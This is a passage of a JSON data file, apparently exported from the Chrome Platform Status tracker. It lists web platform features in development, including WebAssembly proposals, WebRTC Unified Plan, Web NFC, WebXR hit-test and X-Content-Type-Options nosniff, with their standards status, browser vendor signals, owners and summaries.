      "when": "2017-06-14 18:29:14.593950",
      "by": "ericbidelman@google.com"
    },
    "name": "Update header value check of XHR/Fetch API to RFC 7230",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "shiva.jm@samsung.com",
          "hiroshige@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=455099",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We are planning to normalize and check strictly against RFC 7230 the header values, in XHR's setRequestHeader() and Fetch API's JavaScript interfaces.\r\n\r\nValues containing the following octets are rejected:\r\n0x01 -- 0x08, 0x0B, 0x0C, 0x0E - 0x1F, and 0x7F.\r\n\r\nLeading/trailing HTTP whitespace bytes (i.e. the following octets) are removed:\r\n0x09, 0x0A, 0x0D, and 0x20.\r\n\r\nSpec:\r\n  https://fetch.spec.whatwg.org/#concept-header-value\r\n  https://fetch.spec.whatwg.org/#concept-header-value-normalize\r\n",
    "id": 6457425448140800,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-11-29 17:16:39.463400",
      "by": "mustaq@chromium.org"
    },
    "name": "User Activation v2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/#triggered-by-user-activation",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/1903",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "http://crbug.com/696617",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature defines a user activation (or \"user gesture\") behavior that is simple enough for cross-browser implementation.  Browsers today control the use of \"abusable\" of APIs (e.g. opening popups or vibrating) in widely divergent ways.  To unify the web, we need to define a user activation model from scratch that can support all/most existing use-cases though a simple implementation.\r\n",
    "id": 5722065667620864,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-13 14:46:15.638860",
      "by": "maxlg@google.com"
    },
    "name": "User Timing L3",
    "tags": [
      "User Timing L3",
      "Custom User Timing"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/w3c/user-timing/issues/23",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "User Timing L3 extends the existing User Timing API to enable two new use cases:\r\n1. Users can pass in custom timestamps to performance.measure and performance.mark, so as to conduct measurement across arbitrary timestamps. \r\n2. Users can report arbitrary metadata with performance.mark and performance.measure, which provides rich data to analytics via a standardized API.",
    "id": 5149401886490624,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-02-20 17:30:12.999320",
      "by": "ericbidelman@google.com"
    },
    "name": "Web NFC API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://w3c.github.io/web-nfc/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rijubrata.bhaumik@intel.com",
          "alexander.shalamov@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>NFC"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=520391",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://status.modern.ie/webnfcapi",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature gives developers the ability to access Near Field Communication (NFC) functionality of a device, such as reading and writing NFC tags as well as exchanging data between NFC capable devices. ",
    "id": 6261030015467520,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-09-20 18:07:04.390420",
      "by": "Patket@microsoft.com"
    },
    "name": "Web Share Target",
    "tags": [
      "share"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mgiuca@chromium.org",
          "sammc@chromium.org",
          "benwells@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebShare"
        ],
        "flag": false,
        "bug": "https://crbug.com/668389",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Web Share Target is a proposed API for allowing websites to receive shared data (text, URLs, images) and register to be choosable by the user as targets from sharing contexts, including (but not limited to) Web Share.",
    "id": 5662315307335680,
    "resources": {
      "docs": [
        "https://github.com/WICG/web-share-target/blob/master/docs/explainer.md",
        "https://github.com/WICG/web-share-target/blob/master/docs/interface.md"
      ],
      "samples": [
        "https://github.com/WICG/web-share-target/blob/master/docs/explainer.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:46:07.678980",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Bulk Memory Operations",
    "tags": [
      "wasm",
      "webassembly",
      "threads"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/WebAssembly/bulk-memory-operations",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "binji@chromium.org",
          "hablich@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7747",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3476",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a memmove type opcode to WebAssembly and enhance existing data sections to support importable base.This allows better optimization of large memcpy/memmove operations. Data section improvement will make shared libraries work better, especially with threads.\r\n",
    "id": 4590306448113664,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/bulk-memory-operations/blob/master/proposals/bulk-memory-operations/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 14:54:59.012790",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Exception Handling",
    "tags": [
      "wasm",
      "webassembly",
      "exceptions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "kschimpf@chromium.org",
          "eholk@chromium.org",
          "titzer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6577 ",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3483",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add exception support to WebAssembly.\r\n",
    "id": 4756734233018368,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/exception-handling/blob/master/proposals/Level-1.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:31:27.252160",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Reference Types",
    "tags": [
      "wasm",
      "webassembly",
      "host bindings",
      "anyref"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WebAssembly/reference-types",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1444925",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "ahaas@chromium.org",
          "titzer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7581",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3481",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allow WebAssembly modules to hold references to JS/DOM objects, passing them as arguments, storing them in locals and globals, and storing them in WebAssembly.Table objects.\r\n",
    "id": 5166497248837632,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/reference-types/blob/master/proposals/reference-types/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-22 19:52:24.238110",
      "by": "bradnelson@chromium.org"
    },
    "name": "WebAssembly SIMD",
    "tags": [
      "WebAssembly",
      "SIMD",
      "SIMD.js"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "bbudge@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6020&desc=2",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/3746",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WebAssembly SIMD will expose hardware SIMD instructions to WebAssembly applications in a platform-independent way. Implementations will explore using SIMD.js as a basis for WebAssembly SIMD. Add three SIMD vector types: float32x4, float64x2, and int32x4, and corresponding Typed Array views.\r\n\r\nSIMD can speed up applications that process lots of data that is naturally organized as 2, 3, or 4 element vectors. SIMD is also useful when compiling native code to WebAssembly.",
    "id": 6533147810332672,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/design/blob/master/FutureFeatures.md#fixed-width-simd",
        "http://tc39.github.io/ecmascript_simd/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 14:16:10.080450",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Tail Call",
    "tags": [
      "wasm",
      "webassembly",
      "tail call"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WebAssembly/tail-call",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "kschimpf@chromium.org",
          "titzer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7431",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add an explicit tail call and indirect tail call opcodes to WebAssembly.\r\n",
    "id": 5423405012615168,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/tail-call/blob/master/proposals/tail-call/Overview.md"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-06-14 09:57:55.668731",
      "by": "hablich@chromium.org"
    },
    "name": "WebAssembly Worker Based Threads",
    "tags": [
      "wasm",
      "webassembly",
      "threads"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/WebAssembly/threads/blob/master/proposals/threads/Overview.md",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1389458",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "binji@chromium.org",
          "gdeepti@chromium.org",
          "titzer@chromium.org",
          "mtrofin@chromium.org",
          "hablich@chromium.org",
          "nattestad@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=754910",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3477",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The WebAssembly Threads feature allows multiple WebAssembly instances in separate Web Workers to share a single WebAssembly.Memory object.\r\n\r\nAs with SharedArrayBuffers in JavaScript, this allows very fast communication between the Workers. This can be used to offload computation to another thread to keep the main thread and its UI responsive.",
    "id": 5724132452859904,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/threads"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:42.507200",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: AudioDestinationNode has a single output",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "flag": false,
        "bug": "http://crbug.com/633795",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The AudioDestinationNode for an AudioContext has a single output which is the audio data that would be sent to the audio hardware.  This output can be connected to other nodes for further processing if desired.",
    "id": 5563888414228480,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#AudioDestinationNode"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:43:27.469130",
      "by": "jmedley@google.com"
    },
    "name": "WebRTC RTCRtpTransceiver in Unified Plan",
    "tags": [
      "RTCRtpTransceiver",
      "Unified Plan",
      "RTCRtpSender",
      "RTCRtpReceiver",
      "RTCPeerConnection",
      "WebRTC",
      "RTP Media API"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcrtptransceiver-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hbos@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "https://crbug.com/777617",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "When spec-complaint SDP format \"Unified Plan\" is used, RTCRtpTransceiver describes each sender-receiver pair that is added to the RTCPeerConnection. This represents the components used to send and receive media. Exposing the transceiver gives the application the ability to receive media early and provides more control over the generated SDP. APIs that are shipping include RTCRtpTransceiver, RTCPeerConnection.addTransceiver() and RTCPeerConnection.getTransceivers().",
    "id": 4749621767176192,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-01-04 13:18:21.341880",
      "by": "hta@chromium.org"
    },
    "name": "WebRTC Unified Plan SDP",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-rtcweb-jsep-24",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "bug": "https://crbug.com/799030",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Generate and parse SDP according to the JSEP specification\r\nhttps://tools.ietf.org/html/draft-ietf-rtcweb-jsep-24\r\n",
    "id": 5723303167655936,
    "resources": {
      "docs": [
        "https://tools.ietf.org/html/draft-ietf-rtcweb-jsep-24"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-23 09:33:56.941680",
      "by": "fs@opera.com"
    },
    "name": "WebVTT positionAlign and lineAlign",
    "tags": [
      "WebVTT"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webvtt/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.mozilla.org/en-US/firefox/31.0/releasenotes/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "k2.nagaraju@samsung.com",
          "srirama.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media>Track"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=633690",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=168715",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables additional alignment features for WebVTT content (subtitles or captions) in the form of a keyword associated with the 'position' and 'line' settings, as well as JavaScript attributes on the VTTCue interface. (.positionAlign and .lineAlign)",
    "id": 4905656217763840,
    "resources": {
      "docs": [
        "https://w3c.github.io/webvtt/#webvtt-cue-position-alignment",
        "https://w3c.github.io/webvtt/#webvtt-cue-line-alignment"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-05-03 23:37:02.586130",
      "by": "jmedley@google.com"
    },
    "name": "WebXR Hit-test",
    "tags": [
      "AR",
      "XR",
      "ray",
      "raycasting"
    ],
    "comments": "This feature requires enabling the following items in chrome://flags.\r\n#webxr\r\n#webxr-hit-test",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/immersive-web/proposals/issues/9#issuecomment-372793917",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "lincolnfrog@chromium.org",
          "johnpallett@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebVR"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=833633",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Hit-test API is an extension to the WebXR Device API that provides raycasting into the world understanding of the underlying XR device and system. The intent is to provide a simple API that allows apps to place reticles/objects in the real world by casting rays that can be evaluated against the underlying platform's understanding of the real world geometry regardless of how that is implemented (e.g., hit planes, point clouds).",
    "id": 4755348300759040,
    "resources": {
      "docs": [
        "https://github.com/immersive-web/hit-test/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:39:44.370910",
      "by": "jmedley@google.com"
    },
    "name": "Worklet: Credentials mode defaults to \"same-origin\"",
    "comments": "Spec discussion: https://github.com/w3c/css-houdini-drafts/issues/756",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.css-houdini.org/worklets/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Workers"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=838540",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Worklet's credentials mode is specified by WorkletOptions on addModule(). Before this change, \"omit\" is the default credentials mode. This update changes the default credentials mode to \"same-origin\".",
    "id": 6383899018002432,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-11-24 08:58:28.898230",
      "by": "mkwst@chromium.org"
    },
    "name": "X-Content-Type-Options: nosniff",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-nosniff?",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://wpt.fyi/fetch/nosniff",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://crbug.com/788096",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://wpt.fyi/fetch/nosniff",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://wpt.fyi/fetch/nosniff",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The `X-Content-Type-Options: nosniff` header allows a server to assert that its resources may only be executed as script or applied as style if they're delivered with appropriate `Content-Type` headers.",
    "id": 5780195579527168,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:05.002960",
      "by": "ericbidelman@google.com"
    },
    "name": "[MimeTypeArray | PluginArray | Plugin] # getter item() and namedItem() argument should be non-optional",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "lunalu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=701560",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to the spec: \r\n\r\nhttps://html.spec.whatwg.org/multipage/webappapis.html#mimetypearray\r\n\r\nhttps://html.spec.whatwg.org/multipage/webappapis.html#plugins-2\r\n\r\nThose getters' argument should not be optional. An 'index' or 'name' must be specified in order to get the item wanted in the array.",
    "id": 5763883465703424,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:35.216170",
      "by": "ericbidelman@google.com"
    },
    "name": "asm.js",
    "tags": [
      "asm.js",
      "asm",
      "emscripten",
      ""
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
